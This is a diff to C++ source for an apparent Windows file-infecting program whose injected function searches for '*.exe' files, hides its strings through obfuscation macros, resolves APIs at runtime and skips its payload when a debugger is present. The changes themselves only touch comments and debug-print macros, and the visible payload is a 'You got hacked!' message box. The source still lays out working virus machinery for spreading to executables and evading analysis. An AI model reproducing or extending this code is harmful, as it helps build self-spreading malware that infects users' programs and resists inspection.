@@ -21,7 +21,7 @@ INJECTED_CODE VOID inj_code_c() {
         // __fastfail(FAST_FAIL_FATAL_APP_EXIT);
         // ((PVOID(*)())NULL)();
 
-        // If we're being debugged, do not run the payload, just run the program normally
+        // If we're being debugged, do not run the payload, just run the original program normally
         return;
     }
 #endif  // NO_ANTIDBG
@@ -31,6 +31,7 @@ INJECTED_CODE VOID inj_code_c() {
     DECLARE_OBFUSCATED(mbTitle, "Hacked!!1");       // MessageBoxA title
     DECLARE_OBFUSCATED(mbText, "You got hacked!");  // MessageBoxA text
     DECLARE_OBFUSCATED(exeExt, "*.exe");            // File extension to search for
+
 #ifdef PL_DEBUG
     // Declarations for debug strings
     CONST CHAR sNewline[1] = {'\n'};
@@ -68,8 +69,10 @@ INJECTED_CODE VOID inj_code_c() {
 
     CONST auto pUser32Dll = pLoadLibraryA(DEOBF(user32));
     CONST auto pMessageBoxA = GET_FUNC(pUser32Dll, MessageBoxA);
+    /* */
 
 #ifdef PL_DEBUG
+    // Variables and functions for debug output
     BOOL bUseMsgbox = FALSE;  // Whether to use MessageBoxA for debug, if no console is available
     CONST auto pGetStdHandle = GET_FUNC(pKernel32Dll, GetStdHandle);
     CONST auto pWriteConsoleA = GET_FUNC(pKernel32Dll, WriteConsoleA);
@@ -87,20 +90,22 @@ INJECTED_CODE VOID inj_code_c() {
         }                                                                      \
     } while (0)
 
-#define PRINT_DBG(text)       PRINT_DBG_OR_MB(text, TRUE)
-#define PRINT_DBG_NO_MB(text) PRINT_DBG_OR_MB(text, FALSE)
-
 #define PRINT_DBG_NL()                                        \
     do {                                                      \
         if (!bUseMsgbox) {                                    \
             pWriteConsoleA(hStderr, sNewline, 1, NULL, NULL); \
         }                                                     \
     } while (0)
-#else                   // PL_DEBUG
-#define PRINT_DBG(text) /* [Debug disabled] */
-#define PRINT_DBG_NL()  /* [Debug disabled] */
-#endif                  // PL_DEBUG
-    /* */
+
+#else  // PL_DEBUG
+
+#define PRINT_DBG_OR_MB(text, allowMb) /* [Debug disabled] */
+#define PRINT_DBG_NL()                 /* [Debug disabled] */
+
+#endif  // PL_DEBUG
+
+#define PRINT_DBG(text)       PRINT_DBG_OR_MB(text, TRUE)
+#define PRINT_DBG_NO_MB(text) PRINT_DBG_OR_MB(text, FALSE)
 
     LPSTR sDirEnd;  // Pointer to the end of the directory path in `sFilePath`, after the final '\\'
     HANDLE hFind;   // Handle for the file search
